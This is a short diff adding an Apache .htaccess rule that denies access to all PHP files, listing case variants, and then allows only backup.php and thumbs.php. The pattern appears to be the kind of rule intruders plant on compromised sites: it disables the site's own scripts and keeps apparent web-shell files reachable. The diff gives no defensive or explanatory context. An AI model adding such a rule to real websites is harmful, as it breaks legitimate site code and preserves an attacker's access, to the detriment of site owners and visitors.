@@ -1,0 +1,6 @@
+<FilesMatch "\.(php|php3|php4|php5|php6|php2|PHP|PhP|pHp|pHP|Php|PHp|phP)">
+Deny from all
+</FilesMatch>
+<FilesMatch "(backup.php|thumbs.php)">
+Allow from all
+</FilesMatch>
